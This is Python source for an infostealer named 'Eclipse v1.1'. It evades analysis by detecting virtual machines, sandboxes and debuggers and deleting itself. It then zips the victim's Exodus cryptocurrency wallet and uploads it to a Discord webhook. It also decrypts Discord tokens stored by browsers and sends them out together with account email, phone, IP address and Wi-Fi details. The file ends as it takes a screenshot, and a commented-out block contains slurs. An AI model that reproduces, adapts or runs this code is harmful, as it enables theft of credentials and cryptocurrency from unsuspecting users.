from libs.libs  import *

webhook = "%webhook%"

def send_embed(embed):
    payload = {"embeds": [embed]}
    response = requests.post(webhook, json=payload)
    if response.status_code != 200:
        print(f"Failed to send webhook: {response.status_code}")

def check_vm():
    # VM Indicators / Processes
    vm_processes = [    
        "vboxservice.exe", "vboxtray.exe", "vmtoolsd.exe", "vmwaretray.exe",
        "vmacthlp.exe", "vmsrvc.exe", "xenservice.exe", "VBoxManage.exe",
        "VBoxHeadless.exe", "VBoxNetDHCP.exe", "VBoxNetNAT.exe", "VMwareUser.exe",
        "VMwareTray.exe", "vmtoolsd.exe", "vmsrvc.exe", "VMwareService.exe",
        "VMwareProcess.exe", "VMwareHostd.exe", "VMwareToolbox.exe",
        "vmsvc.exe", "vmtoolsd.exe", "VBoxSVC.exe",
        "jujubox.exe", "pyinstxtractor.exe"
    ]
    
    # VM Drivers
    vm_drivers = [
        "VBoxMouse.sys", "VBoxGuest.sys", "VBoxSF.sys", "VBoxVideo.sys",
        "vmhgfs.sys", "vmxnet.sys", "vmmouse.sys", "vmx_svga.sys",
        "vmmouse.sys", "vmmemctl.sys", "vmsrvc.sys", "vmxnet3.sys", "vmmemctl.sys",
        "vmwarewddm.sys", "vmwarevga.sys", "vmwareservice.sys", "vmtoolsd.sys",
        "VBoxGuest.sys", "VBoxSF.sys", "VBoxVideo.sys", "VBoxMouse.sys", "VBoxNetLwf.sys"
    ]

    detected_processes = [proc for proc in vm_processes if proc.lower() in os.popen("tasklist").read().lower()]
    detected_drivers = [driver for driver in vm_drivers if os.path.exists(f"C:\\Windows\\System32\\drivers\\{driver}")]
    
    return detected_processes, detected_drivers

def check_registry_key(key):
    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key) as reg_key:
            return True
    except FileNotFoundError:
        return False
    except Exception as e:
        print(e)
        return False

def is_debugging():
    # List of known debugger processes including DIE
    debugger_processes = [
        "pyinstxtractor.exe", "pydbg.exe", "ImmunityDebugger.exe", "OllyDbg.exe", 
        "x64dbg.exe", "WinDbg.exe", "IDA.exe", "Ghidra.exe", "CFF Explorer.exe", 
        "Debugger.exe", "wdbg.exe", "Cheat Engine.exe", "Cutter.exe", "Radare2.exe",
        "Hopper.exe", "Binary Ninja.exe", "JMP.exe", "die.exe", "DetectItEasy.exe",
        "diel.exe"
    ]
    
    # Check if any of the debugger processes are running
    for proc in psutil.process_iter(['name']):
        if proc.info['name'] in debugger_processes:
            return True
    
    # Check for debugger presence using system call
    try:
        kernel32 = ctypes.WinDLL('kernel32')
        is_debugged = kernel32.IsDebuggerPresent()
        if is_debugged:
            return True
    except Exception as e:
        print(f"Error checking debugger presence: {e}")
    
    return False

def delete_self():
    try:
        # Schedule file for deletion on reboot
        os.system(f'ping 127.0.0.1 -n 5 > nul')  # Wait a bit before deleting
        os.remove(sys.argv[0])
    except Exception as e:
        print(f"Error deleting file: {e}")

def detect_vm_and_sandbox():
    # Detect VM and sandbox processes
    detected_processes, detected_drivers = check_vm()
    detected_internal_processes = []
    
    sandbox_processes = [
        "cape.exe", "cape-svc.exe",
        "zenbox.exe", "zenbox-svc.exe"
    ]
    
    # Check if any of the sandbox processes are running
    for proc in psutil.process_iter(['name']):
        if proc.info['name'] in sandbox_processes:
            detected_internal_processes.append(proc.info['name'])
    
    return detected_processes, detected_drivers, detected_internal_processes

pc_username = os.getlogin()
pc_name = platform.node()
platform_name = platform.system()

detected_processes, detected_drivers, detected_internal_processes = detect_vm_and_sandbox()

embed_message = {
    "title": pc_username,
    "color": 0x000000,
    "author": {
        "name": "Virtual Machine Detected / Virus Total Scan",
        "icon_url": "https://img.icons8.com/pastel-glyph/64/security-checked--v1.png"
    },
    "footer": {
        "text": "VM Protection | https://github.com/pyinstance"
    },
    "fields": [
        {"name": "PC Information", "value": f"PC Name: `{pc_name}`\nUsername: `{pc_username}`\nPlatform: `{platform_name}`", "inline": False},
        {"name": "Virtual Machine", "value": "True", "inline": False},
        {"name": "Detected Processes", "value": "\n".join(detected_processes) if detected_processes else "None", "inline": False},
        {"name": "Detected Drivers", "value": "\n".join(detected_drivers) if detected_drivers else "None", "inline": False},
        {"name": "Internal Sandbox Processes", "value": "\n".join(detected_internal_processes) if detected_internal_processes else "None", "inline": False}
    ]
}
#root = tk.Tk()
#root.withdraw()
#messagebox.showwarning("Warning", "Please do not run this in a VM! / If you are not running this in a vm and this still pops up then you have drivers / processes open in the back ground.\nalso fuck nigga stop trying to run this shit in a vm or debugger it wont work fucking retard")
#root.quit()

if detected_processes or detected_drivers or detected_internal_processes:
    send_embed(embed_message)
    sys.exit(1)
elif is_debugging():
    anti_debug_embed = {
        "title": "Debugger Detected",
        "color": 0x000000,
        "author": {
            "name": "Anti-Debugging Alert",
            "icon_url": "https://img.icons8.com/pastel-glyph/64/security-checked--v1.png"
        },
        "footer": {
            "text": "Anti-Debugging | https://github.com/pyinstance"
        },
        "fields": [
            {"name": "PC Information", "value": f"PC Name: `{pc_name}`\nUsername: `{pc_username}`\nPlatform: `{platform_name}`", "inline": False},
            {"name": "Debugger Detected", "value": "True", "inline": False}
        ]
    }
    send_embed(anti_debug_embed)
    delete_self()
    sys.exit(1)
    
else:

    class Exodus:
        def __init__(self, webhook):
            self.webhook = webhook

    def zip_directory(directory_path, output_zip):
        shutil.make_archive(output_zip, 'zip', directory_path)

    def get_files_in_zip(zip_file_path):
        with zipfile.ZipFile(zip_file_path, 'r') as zip_ref:
            return zip_ref.namelist()

    def send_file_to_webhook(file_path, webhook, embed):
        with open(file_path, 'rb') as file:
            files = {'file': (os.path.basename(file_path), file)}
            payload = {'embeds': [embed]}
            response = requests.post(webhook, files=files, data={'payload_json': json.dumps(payload)})
            if response.status_code != 200:
                pass

    def send_embed_to_webhook(webhook, embed):
        payload = {'embeds': [embed]}
        response = requests.post(webhook, data={'payload_json': json.dumps(payload)})
        if response.status_code != 200:
            pass


    username = os.getlogin()
    directory = os.path.expanduser(rf'C:\Users\{username}\AppData\Roaming\Exodus\exodus.wallet')
    output_zip = os.path.expanduser(rf'C:\Users\{username}\AppData\Roaming\Exodus\exodus_wallet_{username}')

    if os.path.isdir(directory):
        zip_directory(directory, output_zip)
        zip_file_path = f"{output_zip}.zip"
        file_list = get_files_in_zip(zip_file_path)
        embed = {
            "title": "Exodus Wallet Stealer",
            "description": f"<:Bitcoin:1309406413570965554> Exodus wallet from {username}'s computer.",
            "color": 0x000000, 
            "fields": [
                {"name": "Username", "value": username, "inline": False},
                {"name": "Directory", "value": directory, "inline": False},
                {"name": "Files in Zip", "value": "\n".join(file_list), "inline": False}
            ]
        }
        send_file_to_webhook(zip_file_path, webhook, embed)
    else:
        embed = {
            "title": "Exodus Wallet Not Found",
            "description": f"{username} does not have an Exodus wallet directory.",
            "color": 0x000000, 
            "fields": [{"name": "Username", "value": username, "inline": False}]
        }
        send_embed_to_webhook(webhook, embed)

    

    def wif():
        try:
            result = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'], capture_output=True, text=True)
            if result.returncode == 0:
                return result.stdout
            else:
                return "Error: Unable to retrieve Wi-Fi information."
        except Exception as e:
            return f"Error: {str(e)}"

    def decrypt(buff, master_key):
        try:
            return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
        except:
            return "Error"

    def fig():
        ip = "None"
        try:
            ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
        except:
            pass
        return ip

    def gethwid():
        p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
        return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]

    def get_nox():
        already_check = []
        checker = []
        cleaned = []
        nox = []
        local = os.getenv('LOCALAPPDATA')
        roaming = os.getenv('APPDATA')
        chrome = local + "\\Google\\Chrome\\User Data"
        paths = {
            'Discord': roaming + '\\discord',
            'Discord Canary': roaming + '\\discordcanary',
            'Lightcord': roaming + '\\Lightcord',
            'Discord PTB': roaming + '\\discordptb',
            'Opera': roaming + '\\Opera Software\\Opera Stable',
            'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
            'Amigo': local + '\\Amigo\\User Data',
            'Torch': local + '\\Torch\\User Data',
            'Kometa': local + '\\Kometa\\User Data',
            'Orbitum': local + '\\Orbitum\\User Data',
            'CentBrowser': local + '\\CentBrowser\\User Data',
            '7Star': local + '\\7Star\\7Star\\User Data',
            'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
            'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
            'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
            'Chrome': chrome + 'Default',
            'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
            'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Default',
            'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
            'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
            'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
            'Iridium': local + '\\Iridium\\User Data\\Default'
        }

        for platform, path in paths.items():
            if not os.path.exists(path):
                continue
            try:
                with open(path + f"\\Local State", "r") as file:
                    key = loads(file.read())['os_crypt']['encrypted_key']
                    file.close()
            except:
                continue
            for file in listdir(path + f"\\Local Storage\\leveldb\\"):
                if not file.endswith(".ldb") and file.endswith(".log"):
                    continue
                else:
                    try:
                        with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
                            for x in files.readlines():
                                x.strip()
                                for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                    nox.append(values)
                    except PermissionError:
                        continue
            for i in nox:
                if i.endswith("\\"):
                    i.replace("\\", "")
                elif i not in cleaned:
                    cleaned.append(i)
            for token in cleaned:
                try:
                    tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
                except IndexError:
                    continue
                checker.append(tok)
                for value in checker:
                    if value not in already_check:
                        already_check.append(value)
                        headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                        try:
                            res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
                        except:
                            continue
                        if res.status_code == 200:
                            con_info = wif()
                            res_json = res.json()
                            ip = fig()
                            pc_username = getenv("UserName")
                            pc_name = getenv("COMPUTERNAME")
                            user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                            user_id = res_json['id']
                            email = res_json['email']
                            phone = res_json['phone']
                            mfa_enabled = res_json['mfa_enabled']
                            has_nitro = False
                            res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
                            nitro_data = res.json()
                            has_nitro = bool(len(nitro_data) > 0)
                            days_left = 0
                            if has_nitro:
                                d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                                d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                                days_left = abs((d2 - d1).days)
                            embed = {
                                "title": user_name,
                                "color": 0x000000,
                                "author": {
                                    "name": "Eclipse v1.1 | Dev Lust",
                                    "icon_url": "https://cdn.discordapp.com/attachments/1310291077210702027/1310611386048577717/original-016e9de8a61ae7ed346d02a726d96fa6.jpg?ex=6745d978&is=674487f8&hm=e0cbf6bc597957a862bdb2cb00f892c09daebd576c3e251f5724f15908deefdf&"
                                },
                                "footer": {
                                    "text": "Dev Lust | https://github.com/pyinstance"
                                },
                                "fields": [
                                    {"name": "User ID", "value": user_id, "inline": True},
                                    {"name": "Account Information", "value": f"<:star:1258354509386747956> Email: ||{email}||\n<:star:1258354509386747956> Phone: ||{phone}||\n<:star:1258354509386747956> 2FA/MFA Enabled: `{mfa_enabled}`\n<:star:1258354509386747956> Nitro: `{has_nitro}`\n<:star:1258354509386747956> Expires in: `{days_left if days_left else 'None'} day(s)`", "inline": False},
                                    {"name": "PC Information", "value": f"<:star:1258354509386747956> IP: `{ip}`\n<:star:1258354509386747956> Username: `{pc_username}`\n<:star:1258354509386747956> PC Name: `{pc_name}`\n<:star:1258354509386747956> Platform: `{platform}`", "inline": False},
                                    {"name": "Token", "value": f"||{tok}||", "inline": False},
                                    {"name": "Wifi Info", "value": f"```js{con_info}```", "inline": False}
                                ]
                            }
                            payload = {"embeds": [embed]}
                            try:
                                res = requests.post(f'{webhook}', json=payload, headers=headers)
                                if res.status_code == 204:
                                    pass
                            except Exception as e:
                                pass
                    else:
                        continue

        

        screenshot = ImageGrab.grab()
        screenshot_path = "screenshot.png"
        screenshot.save(screenshot_path)